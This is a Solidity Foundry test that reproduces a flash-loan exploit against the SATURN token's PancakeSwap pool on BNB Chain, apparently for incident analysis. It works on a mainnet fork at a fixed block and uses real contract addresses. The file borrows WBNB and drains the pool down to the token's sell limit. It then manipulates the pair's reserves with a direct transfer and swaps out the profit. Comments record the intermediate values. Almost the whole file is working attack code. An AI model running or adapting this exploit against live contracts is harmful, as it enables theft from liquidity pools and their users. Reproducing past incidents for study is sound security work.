// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IPancakeV3.sol";

import "./ISaturn.sol";

address constant SATURNCreater = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;
IPancakePairV3 constant USDT_BNB_Pool = IPancakePairV3(
    0x36696169C63e42cd08ce11f5deeBbCeBae652050
);
IPancakePairV2 constant SATURN_WBNB_Pool = IPancakePairV2(
    0x49BA6c20D3e95374fc1b19D537884b5595AA6124
);
IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
ISaturn constant SATURN = ISaturn(
    payable(0x9BDF251435cBC6774c7796632e9C80B233055b93)
);
IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

contract SaturnTest is Test {
    function setUp() public {
        // bytes32 txHash = 0x948132f219c0a1adbffbee5d9dc63bec676dd69341a6eca23790632cb9475312;
        vm.createSelectFork("bsc", 38488208);
        vm.label(address(SATURN), "SATURN");
        vm.label(address(BNB), "WBNB");
        vm.label(address(PancakeV2Router), "PancakeSwap Router");
        vm.label(address(SATURN_WBNB_Pool), "SATURN_WBNB_Pool");
        vm.label(address(USDT_BNB_Pool), "USDT_BNB_Pool");

        deal(address(SATURN), address(this), 228832.951945080091523153 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        SATURN.approve(address(PancakeV2Router), type(uint256).max);
        BNB.approve(address(PancakeV2Router), type(uint256).max);

        print("BNB balance", BNB.balanceOf(address(this)), 18);

        // start attack
        USDT_BNB_Pool.flash(address(this), 0, 3300 ether, bytes(""));

        print("BNB balance", BNB.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee0;
        data;

        require(msg.sender == address(USDT_BNB_Pool), "not authorized");

        uint256 limit = SATURN.everyTimeSellLimitAmount();
        // console.log("limit", limit);
        // limit -> 50000 ether

        uint256 PoolSaturnBalance = SATURN.balanceOf(address(SATURN_WBNB_Pool));
        // print("PoolSaturnBalance", PoolSaturnBalance, 18);
        // PoolSaturnBalance -> 101530461.164515912233363838

        address[] memory path = new address[](2);
        path[0] = address(BNB);
        path[1] = address(SATURN);

        // print("PoolSaturnBalance - limit", PoolSaturnBalance - limit, 18);
        uint256[] memory amounts = PancakeV2Router.getAmountsIn(
            // 101030461.164515912233363838
            PoolSaturnBalance - limit, // amountOut
            path
        );
        // print("amounts[0]", amounts[0], 18);
        // print("amounts[1]", amounts[1], 18);
        // amounts[0]: 3204.501846852103515422
        // amounts[1]: 101030461.164515912233363838

        PancakeV2Router.swapExactTokensForTokens(
            // 3204.5 ether
            amounts[0],
            0,
            path,
            SATURNCreater,
            block.timestamp
        );

        // PoolSaturnBalance = SATURN.balanceOf(address(SATURN_WBNB_Pool));
        // print("PoolSaturnBalance", PoolSaturnBalance, 18);
        // PoolSaturnBalance: 499999.999999999999999941

        vm.roll(block.number + 1);

        SATURN.transfer(
            address(SATURN_WBNB_Pool),
            228832.951945080091523153 ether
        );

        (uint256 R_SATURN, uint256 R_WBNB, ) = SATURN_WBNB_Pool.getReserves();
        R_WBNB;
        // print("R_SATURN", R_SATURN, 18);
        // print("R_WBNB", R_WBNB, 18);
        // R_SATURN: 0.000000000000021851
        // R_WBNB: 3220.321286629923959716

        PoolSaturnBalance = SATURN.balanceOf(address(SATURN_WBNB_Pool));
        // 217391.304347826086968847
        // print("PoolSaturnBalance", PoolSaturnBalance, 18);

        path[0] = address(SATURN);
        path[1] = address(BNB);
        // print("PoolSaturnBalance - R_SATURN", PoolSaturnBalance - R_SATURN, 18);
        amounts = PancakeV2Router.getAmountsOut(
            // 217391.304347826086946996 = 217391.304347826086968847 - 0.000000000000021851
            PoolSaturnBalance - R_SATURN, // amountIn
            path
        );
        // print("amounts[0]", amounts[0], 18);
        // print("amounts[1]", amounts[1], 18);
        // amounts[0]: 217391.304347826086946996
        // amounts[1]: 14.169439777820443969

        SATURN_WBNB_Pool.swap(0, amounts[1], address(this), bytes(""));

        // deal(address(BNB), address(this), 3300 ether + fee1);
        BNB.transfer(address(USDT_BNB_Pool), 3300 ether + fee1);
    }

    receive() external payable {}
}
